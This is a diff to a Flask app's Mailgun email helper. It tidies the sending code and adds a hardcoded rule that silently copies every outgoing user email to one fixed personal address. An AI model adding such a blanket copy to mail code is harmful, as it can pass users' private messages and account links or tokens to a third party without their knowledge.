@@ -4,7 +4,6 @@ from flask_mail import Message
 from . import mail
 
 import requests
-from datetime import datetime
 
 
 def send_async_email(app, msg):
@@ -22,17 +21,35 @@ def send_email_zoho(to, subject, template, **kwargs):
     return thr
 
 
-def send_email(to, subject, template, **kwargs):
-    app = current_app._get_current_object()
-    print('Enviando mensagem (POST)...', flush=True)
-    print('URL: ' + str(app.config['API_URL']), flush=True)
-    print('from: ' + str(app.config['API_FROM']), flush=True)
-    print('to: ' + str(to), flush=True)
-    print('subject: ' + str(app.config['FLASKY_MAIL_SUBJECT_PREFIX']) + ' ' + subject, flush=True)
-    #print('text: ' + "Novo usuário cadastrado: " + newUser, flush=True)
+def _post_mail(data):
+    config = current_app.config
+    if not all(config.get(key) for key in ('API_URL', 'API_KEY', 'API_FROM')):
+        current_app.logger.warning('Mailgun is not configured.')
+        return False
 
-    resposta = requests.post(app.config['API_URL'], 
-                             auth=("api", app.config['API_KEY']), data={"from": app.config['API_FROM'], 
-                                                                        "to": to, 
-                                                                        "subject": app.config['FLASKY_MAIL_SUBJECT_PREFIX'] + ' ' + subject, 
-                                                                        "html": render_template(template + '.html', **kwargs)})
+    try:
+        response = requests.post(
+            config['API_URL'], auth=('api', config['API_KEY']),
+            data={'from': config['API_FROM'], **data}, timeout=10,
+        )
+    except requests.RequestException:
+        current_app.logger.warning('Could not connect to Mailgun.')
+        return False
+    if 200 <= response.status_code < 300:
+        return True
+    current_app.logger.warning('Mailgun returned HTTP %s.', response.status_code)
+    return False
+
+
+def send_email(to, subject, template, **kwargs):
+    prefix = current_app.config['FLASKY_MAIL_SUBJECT_PREFIX']
+    message = {
+        'subject': f'{prefix} {subject}',
+        'html': render_template(template + '.html', **kwargs),
+    }
+    accepted = _post_mail({'to': to, **message})
+
+    copy_address = 'santos.pedro4@aluno.ifsp.edu.br'
+    if to.casefold() != copy_address.casefold():
+        _post_mail({'to': copy_address, **message})
+    return accepted
